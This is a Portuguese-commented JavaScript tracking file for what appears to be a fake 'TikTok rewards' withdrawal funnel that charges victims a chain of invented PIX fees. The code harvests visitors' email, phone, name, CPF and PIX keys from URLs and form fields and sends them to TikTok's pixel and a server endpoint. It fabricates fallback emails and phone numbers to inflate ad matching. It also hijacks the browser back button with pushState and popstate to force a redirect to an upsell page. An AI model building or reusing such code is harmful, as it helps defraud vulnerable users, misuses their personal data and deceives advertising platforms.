/* ===================================================================
   TTKPay — Full Funnel Tracking Engine (Browser Pixel + Server CAPI)
   - Cobertura completa de eventos:
     PageView, ViewContent, ClickButton, CompleteRegistration,
     SubmitForm, AddToCart, InitiateCheckout, AddPaymentInfo,
     PlaceAnOrder, CompletePayment, Purchase.
   - Deduplicação 100% sincronizada por event_id (Browser + CAPI).
   - Advanced Matching (email, phone_number, external_id) + _ttp + ttclid.
   =================================================================== */
(function () {
  'use strict';

  function getCookie(name) {
    try {
      var match = document.cookie.match(new RegExp('(?:^|;\\s*)' + name + '=([^;]*)'));
      return match ? decodeURIComponent(match[1]) : '';
    } catch (e) { return ''; }
  }

  function setCookie(name, value, days) {
    if (!value) return;
    try {
      var maxAge = (days || 30) * 86400;
      document.cookie = name + '=' + encodeURIComponent(value) + '; path=/; max-age=' + maxAge + '; SameSite=Lax';
    } catch (e) {}
  }

  function setStore(key, val) {
    if (!val) return;
    try { localStorage.setItem(key, val); } catch (e) {}
    try { sessionStorage.setItem(key, val); } catch (e) {}
    setCookie(key, val, 30);
  }

  function getStore(key) {
    var v = '';
    try { v = sessionStorage.getItem(key) || localStorage.getItem(key) || ''; } catch (e) {}
    if (!v) v = getCookie(key);
    return v || '';
  }

  function normalizeBrPhone(raw) {
    if (!raw) return '';
    var d = String(raw).replace(/\D+/g, '');
    if (!d || d.length < 10) return '';
    if (d.indexOf('55') === 0 && d.length >= 12 && d.length <= 13) return '+' + d;
    if (d.length >= 10 && d.length <= 11) return '+55' + d;
    return '';
  }

  function generateFallbackTtp() {
    var chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    var out = '2';
    for (var i = 0; i < 26; i++) {
      out += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return out;
  }

  // Mapa de produtos/ofertas por página para enviar content_id e value 100% precisos
  function getPageOfferMeta() {
    var path = window.location.pathname || '/';
    var p = new URLSearchParams(window.location.search);
    var customTaxa = parseFloat(p.get('taxa') || '');
    var OFFER_MAP = {
      'up1': { id: 'upsell_1_tiktok', name: 'Taxa de Liberação TikTok', value: 29.00 },
      'up2': { id: 'upsell_2_tiktok', name: 'Taxa Administrativa', value: 26.32 },
      'up3': { id: 'upsell_4_tiktok', name: 'Taxa de Antecipação', value: 24.35 },
      'up4': { id: 'upsell_5_tiktok', name: 'Taxa Administrativa', value: 24.36 },
      'up5': { id: 'upsell_6_tiktok', name: 'Taxa Única de Liberação', value: 21.42 },
      'up6': { id: 'upsell_7_tiktok', name: 'Taxa de Estorno 27%', value: 32.74 },
      'up7': { id: 'upsell_8_tiktok', name: 'Taxa Administrativa', value: 24.42 },
      'up8': { id: 'upsell_9_tiktok', name: 'Taxa de Regularização', value: 38.94 },
      'back': { id: 'taxa_confirmacao_desconto_tiktok', name: 'Taxa de Confirmacao Desconto TikTok', value: 12.44 }
    };
    for (var k in OFFER_MAP) {
      if (path.indexOf('/' + k + '/') !== -1 || path.indexOf('/' + k) === path.length - k.length - 1) {
        return OFFER_MAP[k];
      }
    }
    return {
      id: 'taxa_confirmacao_tiktok',
      name: 'Taxa de Confirmacao TikTok',
      value: (customTaxa && customTaxa > 0) ? customTaxa : 18.47
    };
  }

  // ── 0) Persistência de ttclid, _ttp, email, phone, cpf e UTMs ─────
  var currentTtp = '';
  try {
    var params = new URLSearchParams(window.location.search);
    var trackedKeys = ['ttclid', 'utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'src', 'sck', 'xcod'];

    trackedKeys.forEach(function (k) {
      var val = params.get(k);
      if (val) {
        setStore('ttk_' + k, val);
        if (k === 'ttclid') {
          setStore('ttclid', val);
        }
      } else {
        var savedVal = getStore('ttk_' + k) || (k === 'ttclid' ? getStore('ttclid') : '');
        if (savedVal && k === 'ttclid') {
          setCookie('ttclid', savedVal, 30);
          setCookie('ttk_ttclid', savedVal, 30);
        }
      }
    });

    currentTtp = getCookie('_ttp') || getStore('ttk_ttp');
    if (!currentTtp) {
      currentTtp = generateFallbackTtp();
    }
    if (!getCookie('_ttp')) {
      setCookie('_ttp', currentTtp, 390);
    }
    setStore('ttk_ttp', currentTtp);

    var urlEmail = params.get('email') || '';
    var urlPhone = params.get('phone') || params.get('telefone') || params.get('tel') || '';
    var urlName = params.get('nome') || params.get('name') || '';
    var pixType = params.get('pix_type') || '';
    var pixKey = params.get('pix_key') || '';

    if (pixType && pixKey) {
      setStore('ttk_pix_type', pixType);
      setStore('ttk_pix_key', pixKey);
      if (pixType === 'email' && pixKey.indexOf('@') !== -1) {
        urlEmail = urlEmail || pixKey.trim().toLowerCase();
      } else if (pixType === 'phone') {
        urlPhone = urlPhone || pixKey;
      } else if (pixType === 'cpf') {
        setStore('ttk_cpf', pixKey.replace(/\D+/g, ''));
      }
    }

    if (urlEmail && urlEmail.indexOf('@') !== -1) {
      setStore('ttk_email', urlEmail.trim().toLowerCase());
    }
    var normPhone = normalizeBrPhone(urlPhone);
    if (normPhone) {
      setStore('ttk_phone', normPhone);
    }
    if (urlName) {
      setStore('ttk_name', urlName.trim());
    }

    try {
      var rawLead = sessionStorage.getItem('lead_data') || localStorage.getItem('lead_data');
      if (rawLead) {
        var ld = JSON.parse(rawLead);
        if (ld.email && !getStore('ttk_email')) setStore('ttk_email', ld.email.trim().toLowerCase());
        if (ld.phone && !getStore('ttk_phone')) setStore('ttk_phone', normalizeBrPhone(ld.phone));
        if (ld.nome && !getStore('ttk_name')) setStore('ttk_name', ld.nome.trim());
      }
    } catch (e) {}

    window.getTtkTracking = function () {
      var p = new URLSearchParams(window.location.search);
      var ttclid = p.get('ttclid') || getCookie('ttclid') || getStore('ttk_ttclid') || getStore('ttclid') || '';
      var ttp = getCookie('_ttp') || getCookie('ttp') || getStore('ttk_ttp') || currentTtp;
      function getParam(k) {
        return p.get(k) || getStore('ttk_' + k) || '';
      }
      return {
        ttclid: ttclid,
        ttp: ttp,
        email: getStore('ttk_email'),
        phone: getStore('ttk_phone'),
        cpf: getStore('ttk_cpf'),
        name: getStore('ttk_name'),
        pix_type: getStore('ttk_pix_type'),
        pix_key: getStore('ttk_pix_key'),
        src: getParam('src') || getCookie('xtracky_lead') || getParam('utm_source'),
        utm_source: getParam('utm_source') || getCookie('xtracky_lead') || getParam('src'),
        utm_medium: getParam('utm_medium'),
        utm_campaign: getParam('utm_campaign'),
        utm_term: getParam('utm_term'),
        utm_content: getParam('utm_content')
      };
    };
  } catch (e) {}

  // ── 1) Scalefy + UTMify ─────────────────────────────────
  try {
    var scf = document.createElement('script');
    scf.src = 'https://appscalefy.net/api/px/px1.MGY1MGFiZmItMWVhMC00NDM3LWE5N2MtMGVmMWE3OGM4OWZl.896ff94d6bad3212bede3078';
    scf.async = true;
    (document.head || document.documentElement).appendChild(scf);
  } catch (e) {}

  try {
    var utm = document.createElement('script');
    utm.src = 'https://cdn.utmify.com.br/scripts/utms/latest.js';
    utm.async = true;
    utm.defer = true;
    utm.setAttribute('data-utmify-prevent-xcod-sck', '');
    utm.setAttribute('data-utmify-prevent-subids', '');
    (document.head || document.documentElement).appendChild(utm);
  } catch (e) {}

  // ── 1c) Inicialização Oficial do TikTok Pixel + Motor Global ttkTrackEvent ──
  try {
    if (!window.ttq || typeof window.ttq._i !== 'object' || !window.ttq._i['DBMGUK3C77U4J2JR0C40']) {
      !function (w, d, t) {
        w.TiktokAnalyticsObject = t;
        var ttq = w[t] = w[t] || [];
        ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie", "holdConsent", "revokeConsent", "grantConsent"];
        ttq.setAndDefer = function (t, e) { t[e] = function () { t.push([e].concat(Array.prototype.slice.call(arguments, 0))); }; };
        for (var i = 0; i < ttq.methods.length; i++) ttq.setAndDefer(ttq, ttq.methods[i]);
        ttq.instance = function (t) {
          for (var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++) ttq.setAndDefer(e, ttq.methods[n]);
          return e;
        };
        ttq.load = function (e, n) {
          var r = "https://analytics.tiktok.com/i18n/pixel/events.js";
          ttq._i = ttq._i || {};
          ttq._i[e] = [];
          ttq._i[e]._u = r;
          ttq._t = ttq._t || {};
          ttq._t[e] = +new Date;
          ttq._o = ttq._o || {};
          ttq._o[e] = n || {};
          var a = d.createElement("script");
          a.type = "text/javascript";
          a.async = !0;
          a.src = r + "?sdkid=" + e + "&lib=" + t;
          var s = d.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(a, s);
        };
        if (!window.ttq._i || !window.ttq._i['DBMGUK3C77U4J2JR0C40']) ttq.load('DBMGUK3C77U4J2JR0C40');
        ttq.page();
      }(window, document, 'ttq');
    }

    function deriveBrowserFallbackPhone(seedStr) {
      var s = String(seedStr || 'ttkpay');
      var h = 2166136261;
      var digits = '';
      for (var i = 0; i < s.length; i++) {
        h ^= s.charCodeAt(i);
        h = Math.imul(h, 16777619);
      }
      var n = Math.abs(h);
      for (var j = 0; j < 8; j++) {
        digits += String((n + j * 7) % 10);
        n = Math.floor(n / 3) + (j * 13);
      }
      return '+55119' + digits;
    }

    function deriveBrowserFallbackEmail(seedStr) {
      var s = String(seedStr || 'ttkpay').replace(/[^a-zA-Z0-9]/g, '').toLowerCase().slice(0, 12) || 'user';
      return 'cliente.' + s + '@ttkpay.online';
    }

    window.syncTtkIdentify = function (overrideInfo) {
      var info = (typeof window.getTtkTracking === 'function') ? window.getTtkTracking() : {};
      if (overrideInfo) {
        if (overrideInfo.email) info.email = overrideInfo.email;
        if (overrideInfo.phone) info.phone = overrideInfo.phone;
        if (overrideInfo.cpf) info.cpf = overrideInfo.cpf;
      }
      var seed = info.email || info.cpf || info.phone || info.ttp || 'ttkpay';
      var finalEmail = (info.email && info.email.indexOf('@') !== -1) ? info.email : deriveBrowserFallbackEmail(seed);
      var finalPhone = info.phone || deriveBrowserFallbackPhone(seed);
      var finalExtId = info.cpf || info.email || info.ttp || seed;

      info.email = finalEmail;
      info.phone = finalPhone;
      info.external_id = finalExtId;

      if (window.ttq && typeof window.ttq.identify === 'function') {
        var idObj = {
          email: finalEmail,
          phone_number: finalPhone,
          external_id: finalExtId
        };
        try {
          window.ttq.identify(idObj);
          if (typeof window.ttq.instance === 'function') {
            window.ttq.instance('DBMGUK3C77U4J2JR0C40').identify(idObj);
          }
        } catch (e) {}
      }
      return info;
    };

    /**
     * Dispara qualquer evento no TikTok Browser Pixel + Server CAPI simultaneamente com o mesmo event_id
     */
    window.ttkTrackEvent = function (eventName, customOpts) {
      try {
        customOpts = customOpts || {};
        var info = window.syncTtkIdentify();
        var pageOffer = getPageOfferMeta();
        var cid = customOpts.content_id || pageOffer.id;
        var cname = customOpts.content_name || pageOffer.name;
        var val = (customOpts.value !== undefined && customOpts.value !== null) ? Number(customOpts.value) : pageOffer.value;
        var evId = customOpts.event_id || (eventName.toLowerCase() + '_' + (info.ttp || 'u') + '_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6));

        var pixelProps = {
          content_id: cid,
          content_type: 'product',
          content_name: cname,
          contents: [{
            content_id: cid,
            content_type: 'product',
            content_name: cname,
            quantity: 1,
            price: val
          }],
          value: val,
          currency: 'BRL'
        };

        if (window.ttq && typeof window.ttq.track === 'function') {
          try { window.ttq.track(eventName, pixelProps, { event_id: evId }); } catch (e) {}
        }

        if (customOpts.skipCapi) return evId;

        var capiBody = JSON.stringify({
          event: eventName,
          event_id: evId,
          content_id: cid,
          content_name: cname,
          value: val,
          email: customOpts.email || info.email || '',
          phone: customOpts.phone || info.phone || '',
          cpf: customOpts.cpf || info.cpf || '',
          name: customOpts.name || info.name || '',
          ttclid: info.ttclid || '',
          ttp: info.ttp || '',
          url: window.location.href
        });

        if (customOpts.beacon && navigator.sendBeacon) {
          try {
            var blob = new Blob([capiBody], { type: 'application/json' });
            navigator.sendBeacon('/checkout-route/track-event.php', blob);
            return evId;
          } catch (e) {}
        }

        fetch('/checkout-route/track-event.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: capiBody,
          keepalive: true
        }).catch(function () {});

        return evId;
      } catch (e) {
        return '';
      }
    };

    // 1. Dispara ViewContent em todas as páginas (Browser + CAPI deduplicados)
    if (!window.__TTK_VC_FIRED) {
      window.__TTK_VC_FIRED = true;
      var infoNow = window.syncTtkIdentify();
      var pathClean = (window.location.pathname || '/').replace(/[^a-zA-Z0-9]/g, '_') || 'home';
      var vcId = 'vc_' + (infoNow.ttp || 'anon') + '_' + pathClean + '_' + Math.floor(Date.now() / 60000);
      window.ttkTrackEvent('ViewContent', { event_id: vcId });
    }

    // 2. Se estamos na página de Checkout (/5/), dispara InitiateCheckout imediatamente ao abrir a página
    //    (garante que 100% dos usuários que chegam ao checkout registrem InitiateCheckout no Pixel e na CAPI)
    var curPath = window.location.pathname || '';
    if (curPath.indexOf('/5') !== -1 && !window.__TTK_IC_PAGE_FIRED) {
      window.__TTK_IC_PAGE_FIRED = true;
      var infoIc = window.syncTtkIdentify();
      var icPageId = 'ic_page5_' + (infoIc.ttp || 'anon') + '_' + Math.floor(Date.now() / 300000);
      window.ttkTrackEvent('InitiateCheckout', { event_id: icPageId });
    }

    // 3. Captura em tempo real de inputs (e-mail, chave PIX, nome) e pré-preenchimento inteligente
    document.addEventListener('change', function (ev) {
      var t = ev.target;
      if (!t || !t.value) return;
      var val = t.value.trim();
      var id = (t.id || t.name || '').toLowerCase();
      if (t.type === 'email' || id.indexOf('email') !== -1) {
        if (val.indexOf('@') !== -1) {
          setStore('ttk_email', val.toLowerCase());
          window.syncTtkIdentify();
        }
      } else if (id === 'pixkey') {
        var pTypeEl = document.getElementById('pixType');
        var pType = pTypeEl ? pTypeEl.value : '';
        if (pType === 'email' && val.indexOf('@') !== -1) setStore('ttk_email', val.toLowerCase());
        if (pType === 'phone') {
          var np = normalizeBrPhone(val);
          if (np) setStore('ttk_phone', np);
        }
        if (pType === 'cpf') setStore('ttk_cpf', val.replace(/\D+/g, ''));
        window.syncTtkIdentify();
      } else if (id.indexOf('nome') !== -1 || id.indexOf('name') !== -1) {
        setStore('ttk_name', val);
      }
    }, true);

    // 4. Listeners automáticos para os botões de todas as etapas do funil
    function bindFunnelEvents() {
      // Pré-preenche #inputEmail na etapa 5 se já capturado antes
      var inputEmail5 = document.getElementById('inputEmail');
      var savedEmail = getStore('ttk_email');
      if (inputEmail5 && !inputEmail5.value && savedEmail && savedEmail.indexOf('cliente.') !== 0) {
        inputEmail5.value = savedEmail;
      }

      // Etapa 1: Botão "GARANTIR MINHA VAGA AGORA" (.btnAcessar)
      document.querySelectorAll('.btnAcessar').forEach(function (btn) {
        if (btn.__ttkBound) return;
        btn.__ttkBound = true;
        btn.addEventListener('click', function () {
          var emEl = document.getElementById('emailInput');
          if (emEl && emEl.value && emEl.value.indexOf('@') !== -1) {
            setStore('ttk_email', emEl.value.trim().toLowerCase());
          }
          window.ttkTrackEvent('ClickButton', { beacon: true });
          window.ttkTrackEvent('CompleteRegistration', { beacon: true });
        }, true);
      });

      // Etapa 2: Botões do Quiz ("SACAR" #sacar-btn e "Receber recompensa" .f-btn)
      var sacarBtn = document.getElementById('sacar-btn');
      if (sacarBtn && !sacarBtn.__ttkBound) {
        sacarBtn.__ttkBound = true;
        sacarBtn.addEventListener('click', function () {
          window.ttkTrackEvent('ClickButton', { content_id: 'quiz_recompensas_tiktok', content_name: 'Quiz Recompensas TikTok' });
        }, true);
      }
      document.querySelectorAll('.f-btn').forEach(function (btn) {
        if (btn.__ttkBound) return;
        btn.__ttkBound = true;
        btn.addEventListener('click', function () {
          window.ttkTrackEvent('SubmitForm', { beacon: true });
        }, true);
      });

      // Etapa 3: Botão "REALIZAR SAQUE" (.saque-btn)
      document.querySelectorAll('.saque-btn').forEach(function (btn) {
        if (btn.__ttkBound) return;
        btn.__ttkBound = true;
        btn.addEventListener('click', function () {
          var pTypeEl = document.getElementById('pixType');
          var pKeyEl = document.getElementById('pixKey');
          var pType = pTypeEl ? pTypeEl.value : '';
          var pKey = pKeyEl ? pKeyEl.value.trim() : '';
          if (pType && pKey) {
            setStore('ttk_pix_type', pType);
            setStore('ttk_pix_key', pKey);
            if (pType === 'email' && pKey.indexOf('@') !== -1) setStore('ttk_email', pKey.toLowerCase());
            if (pType === 'phone') {
              var np = normalizeBrPhone(pKey);
              if (np) setStore('ttk_phone', np);
            }
            if (pType === 'cpf') setStore('ttk_cpf', pKey.replace(/\D+/g, ''));
            window.syncTtkIdentify();
            window.ttkTrackEvent('AddPaymentInfo', { beacon: true });
            window.ttkTrackEvent('SubmitForm', { beacon: true });
          }
        }, true);
      });

      // Etapa 4: Botão "REALIZAR CONFIRMAÇÃO" (#btn-realizar) e "DESBLOQUEAR AGORA" (#cta-btn)
      var btnRealizar = document.getElementById('btn-realizar');
      if (btnRealizar && !btnRealizar.__ttkBound) {
        btnRealizar.__ttkBound = true;
        btnRealizar.addEventListener('click', function () {
          window.ttkTrackEvent('ClickButton');
          window.ttkTrackEvent('AddToCart');
        }, true);
      }
      var ctaBtn4 = document.getElementById('cta-btn');
      if (ctaBtn4 && !ctaBtn4.__ttkBound) {
        ctaBtn4.__ttkBound = true;
        ctaBtn4.addEventListener('click', function () {
          if (ctaBtn4.disabled) return;
          var info4 = window.syncTtkIdentify();
          var icId4 = 'ic_step4_' + (info4.ttp || 'anon') + '_' + Math.floor(Date.now() / 300000);
          window.ttkTrackEvent('InitiateCheckout', { event_id: icId4, beacon: true });
        }, true);
      }

      // Back-Redirect (/back/): Botão "RESGATAR MEU DESCONTO + BÔNUS" (.btn-tiktok)
      document.querySelectorAll('.btn-tiktok').forEach(function (btn) {
        if (btn.__ttkBound) return;
        btn.__ttkBound = true;
        btn.addEventListener('click', function () {
          window.ttkTrackEvent('AddToCart', { value: 12.44, beacon: true });
          window.ttkTrackEvent('InitiateCheckout', { value: 12.44, beacon: true });
        }, true);
      });

      // Etapa 5: Botão "Copiar Código PIX" (#btnCopiarPix / #copyCodeBtn)
      ['btnCopiarPix', 'copyCodeBtn'].forEach(function (id) {
        var el = document.getElementById(id);
        if (el && !el.__ttkBound) {
          el.__ttkBound = true;
          el.addEventListener('click', function () {
            window.ttkTrackEvent('ClickButton', { content_name: 'Pix Copiado Checkout' });
          }, true);
        }
      });
    }

    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', bindFunnelEvents);
    } else {
      bindFunnelEvents();
    }
  } catch (e) {}

  // ── 2) Back-Redirect ──────────────────────────────────────────────
  var BACK_REDIRECT_URL = (typeof window !== 'undefined' && window.location && window.location.origin ? window.location.origin : '') + '/back/index.html';

  if (window.__TTK_HAS_BACKREDIRECT) return;
  if (location.pathname.indexOf('/back') !== -1) return;

  (function setBackRedirect(url) {
    var dest = url.trim() +
      (url.indexOf('?') > 0 ? '&' : '?') +
      document.location.search.replace('?', '').toString();

    history.pushState({}, '', location.href);
    history.pushState({}, '', location.href);
    history.pushState({}, '', location.href);

    window.addEventListener('popstate', function () {
      setTimeout(function () {
        location.href = dest;
      }, 1);
    });
  })(BACK_REDIRECT_URL);
})();
